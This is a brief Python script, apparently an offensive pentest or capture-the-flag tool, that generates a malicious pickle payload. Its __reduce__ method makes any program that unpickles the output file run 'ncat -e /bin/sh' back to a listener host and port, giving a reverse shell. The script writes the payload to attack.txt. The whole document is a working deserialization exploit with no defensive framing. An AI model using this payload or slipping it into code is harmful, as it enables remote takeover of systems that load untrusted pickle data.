#!/usr/bin/python3

import pickle
import base64
import os
import sys


lhost = "127.0.0.0"
lport = "9000"

class REVSHELL(object):
    def __reduce__(self):
        return (os.system, (f"ncat -e /bin/sh -nv {lhost} {lport} ",))
    

serialPayload = pickle.dumps(REVSHELL())

file = open("attack.txt", "wb")
file.write(serialPayload)

